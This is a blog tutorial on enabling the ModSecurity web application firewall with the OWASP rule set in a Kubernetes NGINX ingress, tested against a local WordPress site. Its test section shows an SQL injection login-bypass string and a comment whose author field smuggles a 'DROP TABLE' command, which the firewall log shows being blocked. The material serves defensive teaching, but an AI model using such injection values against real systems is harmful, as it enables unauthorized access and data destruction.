<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel=preload as=font href=https://nickmcgrath.github.io/fonts/vendor/jost/jost-v4-latin-regular.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=https://nickmcgrath.github.io/fonts/vendor/jost/jost-v4-latin-500.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=https://nickmcgrath.github.io/fonts/vendor/jost/jost-v4-latin-700.woff2 type=font/woff2 crossorigin><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><link rel=stylesheet href=https://nickmcgrath.github.io/main.a9766808cc170b7224d6c969e272d562a37e80eda544ddb0f23c9d19c2104bbcfadff82668189ca822aec637055a0bcc40c44dd292b466d4463ce21ef443cb07.css integrity="sha512-qXZoCMwXC3Ik1slp4nLVYqN+gO2lRN2w8jydGcIQS7z63/gmaBicqCKuxjcFWgvMQMRN0pK0ZtRGPOIe9EPLBw==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><meta name=robots content="index, follow"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><title>K8s Nginx Ingress Mod Security WAF - Learn by Doing</title><meta name=description content="What the WAF? #A web application firewall (WAF) is a security tool that monitors and controls incoming traffic to a web application. It is used to protect web applications from various types of attacks, such as SQL injection, cross-site scripting (XSS), and file inclusion vulnerabilities. WAFs also help to prevent unauthorized access to sensitive data and can be used to comply with security regulations. Overall, a WAF is an important tool to help keep web applications and the data they handle secure."><link rel=canonical href=https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="og:title" content="K8s Nginx Ingress Mod Security WAF"><meta property="og:description" content="What the WAF? #A web application firewall (WAF) is a security tool that monitors and controls incoming traffic to a web application. It is used to protect web applications from various types of attacks, such as SQL injection, cross-site scripting (XSS), and file inclusion vulnerabilities. WAFs also help to prevent unauthorized access to sensitive data and can be used to comply with security regulations. Overall, a WAF is an important tool to help keep web applications and the data they handle secure."><meta property="og:url" content="https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/"><meta property="og:site_name" content="Learn by Doing"><meta property="article:published_time" content="2023-01-09T22:03:50-08:00"><meta property="article:modified_time" content="2023-01-09T22:03:50-08:00"><meta property="og:image" content="https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/lock-in-clouds.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:site content="@getdoks"><meta name=twitter:creator content="@henkverlinde"><meta name=twitter:title content="K8s Nginx Ingress Mod Security WAF"><meta name=twitter:description content><meta name=twitter:image content="https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/lock-in-clouds.png"><meta name=twitter:image:alt content="K8s Nginx Ingress Mod Security WAF"><script type=application/ld+json>{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://nickmcgrath.github.io/#/schema/organization/1","name":"Doks","url":"https://nickmcgrath.github.io/","sameAs":["https://twitter.com/getdoks","https://github.com/h-enk/doks"],"logo":{"@type":"ImageObject","@id":"https://nickmcgrath.github.io/#/schema/image/1","url":"https://nickmcgrath.github.io/logo-doks.png","width":512,"height":512,"caption":"Doks"},"image":{"@id":"https://nickmcgrath.github.io/#/schema/image/1"}},{"@type":"WebSite","@id":"https://nickmcgrath.github.io/#/schema/website/1","url":"https://nickmcgrath.github.io/","name":"Learn by Doing","description":"welcome","publisher":{"@id":"https://nickmcgrath.github.io/#/schema/organization/1"}},{"@type":"WebPage","@id":"https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/","url":"https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/","name":"K8s Nginx Ingress Mod Security WAF","description":"","isPartOf":{"@id":"https://nickmcgrath.github.io/#/schema/website/1"},"about":{"@id":"https://nickmcgrath.github.io/#/schema/organization/1"},"datePublished":"2023-01-09T22:03:50CET","dateModified":"2023-01-09T22:03:50CET","breadcrumb":{"@id":"https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/#/schema/breadcrumb/1"},"primaryImageOfPage":{"@id":"https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/#/schema/image/2"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/"]}]},{"@type":"BreadcrumbList","@id":"https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/#/schema/breadcrumb/1","name":"Breadcrumbs","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"https://nickmcgrath.github.io/","url":"https://nickmcgrath.github.io/","name":"Home"}},{"@type":"ListItem","position":2,"item":{"@type":"WebPage","@id":"https://nickmcgrath.github.io/blog/","url":"https://nickmcgrath.github.io/blog/","name":"Blog"}},{"@type":"ListItem","position":3,"item":{"@id":"https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/"}}]},{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://nickmcgrath.github.io/#/schema/article/1","headline":"K8s Nginx Ingress Mod Security WAF","description":"","isPartOf":{"@id":"https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/"},"mainEntityOfPage":{"@id":"https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/"},"datePublished":"2023-01-09T22:03:50CET","dateModified":"2023-01-09T22:03:50CET","author":{"@id":"https://nickmcgrath.github.io/#/schema/person/2"},"publisher":{"@id":"https://nickmcgrath.github.io/#/schema/organization/1"},"image":{"@id":"https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/#/schema/image/2"}}]},{"@context":"https://schema.org","@graph":[{"@type":"Person","@id":"https://nickmcgrath.github.io/#/schema/person/2","name":"Henk Verlinde","sameAs":["https://twitter.com/henkverlinde","https://www.linkedin.com/in/henkverlinde/","https://github.com/h-enk"]}]},{"@context":"https://schema.org","@graph":[{"@type":"ImageObject","@id":"https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/#/schema/image/2","url":"https://nickmcgrath.github.io/doks.png","contentUrl":"https://nickmcgrath.github.io/doks.png","caption":"K8s Nginx Ingress Mod Security WAF"}]}]}</script><meta name=theme-color content="#fff"><link rel=icon href=https://nickmcgrath.github.io/favicon.ico sizes=any><link rel=apple-touch-icon sizes=180x180 href=https://nickmcgrath.github.io/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://nickmcgrath.github.io/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://nickmcgrath.github.io/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=https://nickmcgrath.github.io/site.webmanifest><script async src="https://www.googletagmanager.com/gtag/js?id=G-MRMPDEHX2C"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-MRMPDEHX2C")</script></head><body class="blog single"><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg navbar-light doks-navbar"><nav class="container-xxl flex-wrap flex-lg-nowrap" aria-label="Main navigation"><a class="navbar-brand order-0" href=https://nickmcgrath.github.io/ aria-label="Learn by Doing">Learn by Doing</a>
<button class="btn btn-menu order-2 d-block d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasDoks aria-controls=offcanvasDoks aria-label="Open main menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button><div class="offcanvas offcanvas-end border-0 py-lg-1" tabindex=-1 id=offcanvasDoks data-bs-backdrop=true aria-labelledby=offcanvasDoksLabel><div class="header-bar d-lg-none"></div><div class="offcanvas-header d-lg-none"><h2 class="h5 offcanvas-title ps-2" id=offcanvasDoksLabel><a class=text-dark href=https://nickmcgrath.github.io/>Learn by Doing</a></h2><button type=button class="btn-close text-reset me-2" data-bs-dismiss=offcanvas aria-label="Close main menu"></button></div><div class="offcanvas-body p-4 p-lg-0"><ul class="nav flex-column flex-lg-row align-items-lg-center mt-2 mt-lg-0 ms-lg-2 me-lg-auto"><li class=nav-item><a class="nav-link ps-0 py-1" href=https://nickmcgrath.github.io/docs/prologue/introduction/>Docs</a></li><li class=nav-item><a class="nav-link ps-0 py-1 active" href=https://nickmcgrath.github.io/blog/>Blog</a></li></ul><hr class="text-black-50 my-4 d-lg-none"><form class="doks-search position-relative flex-grow-1 ms-lg-auto me-lg-2"><input id=search class="form-control is-search" type=search placeholder="Search docs..." aria-label="Search docs..." autocomplete=off><div id=suggestions class="shadow bg-white rounded d-none"></div></form><hr class="text-black-50 my-4 d-lg-none"><ul class="nav flex-column flex-lg-row"><li class=nav-item><a class="nav-link social-link" href=https://github.com/NickMcGrath><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg><small class="ms-2 d-lg-none">GitHub</small></a></li><li class=nav-item><a class="nav-link social-link" href=https://www.linkedin.com/in/nicholas-mcgrath><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-linkedin"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg><small class="ms-2 d-lg-none">LinkedIn</small></a></li></ul><hr class="text-black-50 my-4 d-lg-none"><button id=mode class="btn btn-link" type=button aria-label="Toggle user interface mode">
<span class=toggle-dark><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg></span><span class=toggle-light><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></span></button></div></div></nav></header></div><div class="wrap container-xxl" role=document><div class=content><article><div class="row justify-content-center"><div class="col-md-12 col-lg-10"><div class=blog-header><h1>K8s Nginx Ingress Mod Security WAF</h1><p><small>Posted&nbsp;in&nbsp;<a class="stretched-link position-relative link-muted" href=https://nickmcgrath.github.io/categories/kubernetes/>kubernetes</a>&nbsp;on&nbsp;January 9, 2023 by <a class="stretched-link position-relative" href=https://nickmcgrath.github.io/contributors/nicholas-mcgrath/>Nicholas McGrath</a>&nbsp;&dash;&nbsp;<strong>9&nbsp;min read</strong></small><p></div></div><div class=col-md-13><div><figure class=figure><img class="figure-img img-fluid lazyload blur-up" data-sizes=auto src=https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/lock-in-clouds_hua362ef40a8ecc8ca75f02fffaad74dc3_1941206_8ef85ada50904e767e8c85872f929341.png data-srcset="https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/lock-in-clouds_hua362ef40a8ecc8ca75f02fffaad74dc3_1941206_502daf24ee42bf61160bc7be65c73f62.png 900w,https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/lock-in-clouds_hua362ef40a8ecc8ca75f02fffaad74dc3_1941206_625181015c44a01881e299a8ac9a0bd4.png 800w,https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/lock-in-clouds_hua362ef40a8ecc8ca75f02fffaad74dc3_1941206_0b0348c8846eaff69affe25cbeca103f.png 700w,https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/lock-in-clouds_hua362ef40a8ecc8ca75f02fffaad74dc3_1941206_f6d0343873936004cf653693d31dbacc.png 600w,https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/lock-in-clouds_hua362ef40a8ecc8ca75f02fffaad74dc3_1941206_274d06f48457ba1d59adad6a2ef4fde7.png 500w" width=1270 height=715 alt="K8s Nginx Ingress Mod Security WAF"><noscript><img class="figure-img img-fluid" sizes=100vw srcset="https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/lock-in-clouds_hua362ef40a8ecc8ca75f02fffaad74dc3_1941206_502daf24ee42bf61160bc7be65c73f62.png 900w,https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/lock-in-clouds_hua362ef40a8ecc8ca75f02fffaad74dc3_1941206_625181015c44a01881e299a8ac9a0bd4.png 800w,https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/lock-in-clouds_hua362ef40a8ecc8ca75f02fffaad74dc3_1941206_0b0348c8846eaff69affe25cbeca103f.png 700w,https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/lock-in-clouds_hua362ef40a8ecc8ca75f02fffaad74dc3_1941206_f6d0343873936004cf653693d31dbacc.png 600w,https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/lock-in-clouds_hua362ef40a8ecc8ca75f02fffaad74dc3_1941206_274d06f48457ba1d59adad6a2ef4fde7.png 500w" src=https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/lock-in-clouds_hua362ef40a8ecc8ca75f02fffaad74dc3_1941206_1270x715_fill_box_center_3.png width=1270 height=715 alt="K8s Nginx Ingress Mod Security WAF"></noscript></figure></div></div><div class="col-md-12 col-lg-9"><h2 id=what-the-waf>What the WAF? <a href=#what-the-waf class=anchor aria-hidden=true>#</a></h2><p>A web application firewall (WAF) is a security tool that monitors and controls incoming traffic to a web application. It
is used to protect web applications from various types of attacks, such as SQL injection, cross-site scripting (XSS),
and file inclusion vulnerabilities. WAFs also help to prevent unauthorized access to sensitive data and can be used to
comply with security regulations. Overall, a WAF is an important tool to help keep web applications and the data they
handle secure.</p><h2 id=introduction-to-technologies>Introduction to Technologies <a href=#introduction-to-technologies class=anchor aria-hidden=true>#</a></h2><p>NGINX is Kubernetes most popular ingress controller with powerful open source add-ons. We will be exploring using
ModSecurity engine to secure our publicly exposed services.</p><p><a href=https://artifacthub.io/packages/helm/ingress-nginx/ingress-nginx>NGINX by Kubernetes community</a> is used to control
external access to services by routing incoming traffic.</p><p><a href=https://minikube.sigs.k8s.io/docs/>Minikube</a> is a tool for running a single-node Kubernetes cluster locally on your
computer, it allows developers to test and develop applications that run on Kubernetes. It is open-source and available
for Linux, macOS and Windows.</p><p><a href=https://github.com/SpiderLabs/ModSecurity>ModSecurity</a> is an open-source web application firewall (WAF) module for the
Apache, Nginx, and IIS web servers. It can be used to protect web applications from various types of attacks, such as
SQL injection and cross-site scripting (XSS). It provides a set of rules that can be used to detect and block malicious
requests.</p><p><a href=https://github.com/coreruleset/coreruleset>ModSecurity OWASP Core Rule Set (CRS)</a> is a collection of generic attack
detection rules for the ModSecurity web application firewall (WAF). It provides protection against a wide range of known
web application vulnerabilities and misconfigurations, such as SQL injection and cross-site scripting. It is developed
and maintained by the Open Web Application Security Project (OWASP).</p><h2 id=flowchart>Flowchart <a href=#flowchart class=anchor aria-hidden=true>#</a></h2><pre><code class=language-mermaid>%%{init: {'theme':'dark'}}%%
flowchart
A((Client)) -- Makes Request----&gt; INGRESS
subgraph K8[Kubernets Cluster]
 subgraph NGINX[NGINX Ingress]
   INGRESS[Ingress] -- Uses --&gt; MOD
   MOD[ModSecurity] -- Uses --&gt; OWASP{OWASP Ruleset}
   OWASP --Decides--&gt; ALLOW[Allow Request]
   OWASP --Decides--&gt; DENY[Deny Request]
   EGRESS[Egress]
 end
 subgraph WORDD[Wordpress Deployment]
 ALLOW -- Routes --&gt; S(Wordpress Service)
 S -- Routes to--&gt; W(Wordpress Pod)
 W -- Queries--&gt; D[(SQL Database Pod)]
 D -- Responds to --&gt; W
 W -- Responds to ---&gt; EGRESS
 end
end
DENY -- Deny Request ---&gt; A
EGRESS -- Responds to ----&gt; A
</code></pre><p><a href=https://youtu.be/40VfZ_nIFWI>Ingress Networking Video</a></p><h2 id=development-cluster-setup>Development Cluster Setup <a href=#development-cluster-setup class=anchor aria-hidden=true>#</a></h2><p>We can use Minikube to create a local desktop kubernetes cluster. After installation, we need to start our cluster.</p><pre><code class=language-shell>minikube start
</code></pre><h2 id=creating-a-testing-application>Creating a testing application <a href=#creating-a-testing-application class=anchor aria-hidden=true>#</a></h2><p>We will use WordPress as an example application and create the ingress for the service.</p><p>This helm deployment with set up WordPress frontend with a MariaDB backend and expose the application internally using a
Cluster IP service.</p><pre><code class=language-shell>helm repo add bitnami https://charts.bitnami.com/bitnami
helm repo update
helm upgrade --install wordpress bitnami/wordpress --set service.type=ClusterIP --set wordpressPassword='yolo' --version 15.2.33
</code></pre><pre><code class=language-shell>kubectl get service
NAME                TYPE           CLUSTER-IP      EXTERNAL-IP   PORT(S)         AGE
...
wordpress           ClusterIP      10.96.22.55     &lt;none&gt;        80/TCP,443/TCP  10m
wordpress-mariadb   ClusterIP      10.101.67.174   &lt;none&gt;        3306/TCP        10m
</code></pre><h2 id=configuring-our-ingress>Configuring our Ingress <a href=#configuring-our-ingress class=anchor aria-hidden=true>#</a></h2><p>We can edit our ingress via a config map or helm override variables, we will be using helm override variables. From the
NGNIX Ingress
controller <a href=https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/configmap/#configmaps>site</a> we
can see the enable-modsecurity and enable-owasp-modsecurity-crs are off by default. We can also edit the
<a href=https://github.com/SpiderLabs/ModSecurity/blob/v3/master/modsecurity.conf-recommended>modsecurity-snippet</a> to
configure Modsecurity to our liking.</p><p>Here is a basic example</p><pre><code class=language-yaml>controller:
  config:
    # Enable Modsecurity and the OWASP Core rule set
    enable-modsecurity: &quot;true&quot;
    enable-owasp-modsecurity-crs: &quot;true&quot;
    # Update ModSecurity config and rules
    modsecurity-snippet: |
      # Enable prevention mode. Can be any of: DetectionOnly,On,Off
      SecRuleEngine On

      # Enable scanning of the request body
      SecRequestBodyAccess On

      # On 403 response log
      SecAuditLog /dev/stdout
      SecAuditLogFormat JSON
      SecAuditEngine RelevantOnly
</code></pre><p>minikube tunnel runs as a process, creating a network route on the host to the service CIDR of the cluster using the
clusterâ€™s IP address as a gateway. The tunnel command exposes the external IP directly to any program running on the
host operating system.</p><pre><code class=language-shell>minikube tunnel
</code></pre><p>Applying nginx helm chart</p><pre><code class=language-shell>helm repo add nginx https://helm.nginx.com/stable
helm repo update
helm install ingress-nginx -f ./nginx-helm-values.yaml ingress-nginx/ingress-nginx -n nginx-ingress --create-namespace --version 0.16.0
</code></pre><p>Applying ingress to WordPress service</p><pre><code class=language-yaml>apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: wordpress-ingress
  annotations:
    kubernetes.io/ingress.class: &quot;nginx&quot;
spec:
  rules:
    - host: mynewblog.ca
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: wordpress
                port:
                  number: 80
</code></pre><p>Adding local DNS to route using our ingress. Open cmd as admin</p><pre><code class=language-shell>notepad c:\Windows\System32\Drivers\etc\hosts
</code></pre><p>Append record pointing to ingress ip</p><pre><code class=language-shell>127.0.0.1 mynewblog.ca
</code></pre><p><img class="img-fluid lazyload blur-up" srcset="https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/mynewblog_hu9ae23a059a95535f42d7e46637bb9af4_30943_dd602a61be41958d68609ea6ff984c05.webp 480w, https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/mynewblog_hu9ae23a059a95535f42d7e46637bb9af4_30943_c60baf613b310c3e37283f89a09f03f8.webp 720w, https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/mynewblog_hu9ae23a059a95535f42d7e46637bb9af4_30943_823x0_resize_q75_h2_box_3.webp 823w" sizes=80vw src=https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/mynewblog_hu9ae23a059a95535f42d7e46637bb9af4_30943_823x0_resize_q75_h2_box_3.webp alt="mynewblog.ca website" title="Our Wordpress Site" width=823 height=569></p><h2 id=test-out-our-waf>Test out our WAF <a href=#test-out-our-waf class=anchor aria-hidden=true>#</a></h2><p>Let's navigate to the &ldquo;Hello world!&rdquo; post and try to leave some comments</p><h3 id=good-comment>Good comment <a href=#good-comment class=anchor aria-hidden=true>#</a></h3><p><img class="img-fluid lazyload blur-up" srcset="https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/normal-comment_hu2121016afaf6abb93278620f8d401ffc_25622_f578205f11ba87a35ce04705ed146f90.webp 480w, https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/normal-comment_hu2121016afaf6abb93278620f8d401ffc_25622_681x0_resize_q75_h2_box_3.webp 681w" sizes=80vw src=https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/normal-comment_hu2121016afaf6abb93278620f8d401ffc_25622_681x0_resize_q75_h2_box_3.webp alt="Good wordpress comment" title="Normal comment" width=681 height=735></p><h3 id=result>Result <a href=#result class=anchor aria-hidden=true>#</a></h3><p>Allows us to leave the comment, note this is expected to be moderator approved for this WordPress plugin.
<img class="img-fluid lazyload blur-up" srcset="https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/good-result_hu9cf9dae7920a58957a57fa57964fba61_30209_20c8ed64daace655e4ae5c68bf208be1.webp 480w, https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/good-result_hu9cf9dae7920a58957a57fa57964fba61_30209_681x0_resize_q75_h2_box_3.webp 681w" sizes=80vw src=https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/good-result_hu9cf9dae7920a58957a57fa57964fba61_30209_681x0_resize_q75_h2_box_3.webp alt="Good comment result" title="Normal comment result" width=681 height=517></p><h3 id=sql-injection>SQL Injection <a href=#sql-injection class=anchor aria-hidden=true>#</a></h3><p>An example of a SQL injection attack is when an attacker inputs a malicious SQL statement into a login form&rsquo;s input
field. The attack could take the form of entering the following into the login form&rsquo;s &ldquo;username&rdquo; field:</p><pre><code>' OR 1=1 --
</code></pre><pre><code class=language-sql>SELECT *
FROM users
WHERE username = ''
   OR 1 = 1 - -' AND password = 'password_entered_by_user'
</code></pre><p>This query will always return true and therefore the attacker will be able to login without knowing the correct
credentials. In this example, the attacker is able to bypass the login form and gain unauthorized access to the
application&rsquo;s data by injecting a malicious SQL statement into the input field.</p><p><img class="img-fluid lazyload blur-up" srcset="https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/bad-comment1_hudb58b54521c10c2efdc6f9c4ffa7a96d_28590_482024149121e0d481f6ee7e4e71685f.webp 480w, https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/bad-comment1_hudb58b54521c10c2efdc6f9c4ffa7a96d_28590_681x0_resize_q75_h2_box_3.webp 681w" sizes=80vw src=https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/bad-comment1_hudb58b54521c10c2efdc6f9c4ffa7a96d_28590_681x0_resize_q75_h2_box_3.webp alt="SQL Injection" title="SQL Injection" width=681 height=735></p><p><img class="img-fluid lazyload blur-up" srcset="https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/bad-result_huc00878d2cc9f9a93f3bf29f98dbe48d2_10383_930ff93c81472deb63082d32a04afdc7.webp 480w, https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/bad-result_huc00878d2cc9f9a93f3bf29f98dbe48d2_10383_502x0_resize_q75_h2_box_3.webp 502w" sizes=80vw src=https://nickmcgrath.github.io/blog/k8s-nginx-ingress-mod-security-waf/bad-result_huc00878d2cc9f9a93f3bf29f98dbe48d2_10383_502x0_resize_q75_h2_box_3.webp alt="Bad result" title="Result from bad comment" width=502 height=208></p><h4 id=log>Log <a href=#log class=anchor aria-hidden=true>#</a></h4><pre><code class=language-shell>kubectl logs deployment/ingress-nginx-controller
</code></pre><pre><code class=language-json>{
  &quot;transaction&quot;: {
    &quot;client_ip&quot;: &quot;172.17.0.1&quot;,
    &quot;time_stamp&quot;: &quot;Sun Jan 29 00:35:12 2023&quot;,
    &quot;server_id&quot;: &quot;f08c3b1b9631dae9ae3fcc0eb2a796ab80f25776&quot;,
    &quot;client_port&quot;: 60820,
    &quot;host_ip&quot;: &quot;172.17.0.14&quot;,
    &quot;host_port&quot;: 80,
    &quot;unique_id&quot;: &quot;167495251246.489669&quot;,
    &quot;request&quot;: {
      &quot;method&quot;: &quot;POST&quot;,
      &quot;http_version&quot;: 1.1,
      &quot;uri&quot;: &quot;/wp-comments-post.php&quot;,
      &quot;body&quot;: &quot;comment=Great+stuff+Captain%21&amp;author=jack%3B+DROP+TABLE+Suppliers&amp;email=jack%40mailinator.com&amp;url=jackattack.ca&amp;submit=Post+Comment&amp;comment_post_ID=1&amp;comment_parent=0&quot;,
      &quot;headers&quot;: {
        &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;,
        &quot;Cache-Control&quot;: &quot;max-age=0&quot;,
        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,
        &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36&quot;,
        &quot;DNT&quot;: &quot;1&quot;,
        &quot;Origin&quot;: &quot;http://mynewblog.ca&quot;,
        &quot;Referer&quot;: &quot;http://mynewblog.ca/2023/01/24/hello-world/?unapproved=2&amp;moderation-hash=4b3bb66b25ed68730461b027d1e2466e&quot;,
        &quot;Content-Length&quot;: &quot;167&quot;,
        &quot;Connection&quot;: &quot;keep-alive&quot;,
        &quot;Host&quot;: &quot;mynewblog.ca&quot;,
        &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
        &quot;Cookie&quot;: &quot;wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US&quot;,
        &quot;Accept-Language&quot;: &quot;en-US,en;q=0.9&quot;
      }
    },
    &quot;response&quot;: {
      &quot;http_code&quot;: 403,
      &quot;headers&quot;: {
        &quot;Server&quot;: &quot;&quot;,
        &quot;Server&quot;: &quot;&quot;,
        &quot;Date&quot;: &quot;Sun, 29 Jan 2023 00:35:12 GMT&quot;,
        &quot;Content-Length&quot;: &quot;548&quot;,
        &quot;Content-Type&quot;: &quot;text/html&quot;,
        &quot;Connection&quot;: &quot;keep-alive&quot;
      }
    },
    &quot;producer&quot;: {
      &quot;modsecurity&quot;: &quot;ModSecurity v3.0.8 (Linux)&quot;,
      &quot;connector&quot;: &quot;ModSecurity-nginx v1.0.2&quot;,
      &quot;secrules_engine&quot;: &quot;Enabled&quot;,
      &quot;components&quot;: [
        &quot;OWASP_CRS/3.3.4\&quot;&quot;
      ]
    },
    &quot;messages&quot;: [
      {
        &quot;message&quot;: &quot;SQL Injection Attack Detected via libinjection&quot;,
        &quot;details&quot;: {
          &quot;match&quot;: &quot;detected SQLi using libinjection.&quot;,
          &quot;reference&quot;: &quot;v785,26&quot;,
          &quot;ruleId&quot;: &quot;942100&quot;,
          &quot;file&quot;: &quot;/etc/nginx/owasp-modsecurity-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf&quot;,
          &quot;lineNumber&quot;: &quot;46&quot;,
          &quot;data&quot;: &quot;Matched Data: n;Tnn found within ARGS:author: jack; DROP TABLE Suppliers&quot;,
          &quot;severity&quot;: &quot;2&quot;,
          &quot;ver&quot;: &quot;OWASP_CRS/3.3.4&quot;,
          &quot;rev&quot;: &quot;&quot;,
          &quot;tags&quot;: [],
          &quot;maturity&quot;: &quot;0&quot;,
          &quot;accuracy&quot;: &quot;0&quot;
        }
      },
      {
        &quot;message&quot;: &quot;Inbound Anomaly Score Exceeded (Total Score: 5)&quot;,
        &quot;details&quot;: {
